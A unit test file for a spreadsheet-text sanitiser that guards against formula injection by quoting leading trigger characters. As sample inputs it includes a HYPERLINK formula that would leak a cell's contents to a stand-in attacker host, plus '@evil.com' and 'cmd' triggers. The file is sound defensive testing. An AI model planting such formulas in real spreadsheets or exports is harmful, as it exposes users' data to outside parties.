import { describe, expect, it } from "vitest";
import { sanitizeSpreadsheetText } from "./spreadsheet";

describe("sanitizeSpreadsheetText", () => {
  it("should return fallback '-' for null or empty input", () => {
    expect(sanitizeSpreadsheetText(null)).toBe("-");
    expect(sanitizeSpreadsheetText(undefined)).toBe("-");
    expect(sanitizeSpreadsheetText("")).toBe("-");
  });

  it("should prefix formula trigger characters with a single quote", () => {
    expect(sanitizeSpreadsheetText("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
    expect(sanitizeSpreadsheetText("+123456")).toBe("'+123456");
    expect(sanitizeSpreadsheetText("-100")).toBe("'-100");
    expect(sanitizeSpreadsheetText("@evil.com")).toBe("'@evil.com");
    expect(sanitizeSpreadsheetText("\tcmd")).toBe("'\tcmd");
    expect(sanitizeSpreadsheetText("\rcmd")).toBe("'\rcmd");
    expect(
      sanitizeSpreadsheetText(
        '=HYPERLINK("http://attacker.com?leak="&A1, "Click")',
      ),
    ).toBe('\'=HYPERLINK("http://attacker.com?leak="&A1, "Click")');
  });

  it("should not modify normal text that does not start with formula characters", () => {
    expect(sanitizeSpreadsheetText("Pengecoran lantai 2")).toBe(
      "Pengecoran lantai 2",
    );
    expect(sanitizeSpreadsheetText("Cerah berawan")).toBe("Cerah berawan");
    expect(sanitizeSpreadsheetText("📌 Pekerjaan Kolom")).toBe(
      "📌 Pekerjaan Kolom",
    );
  });
});
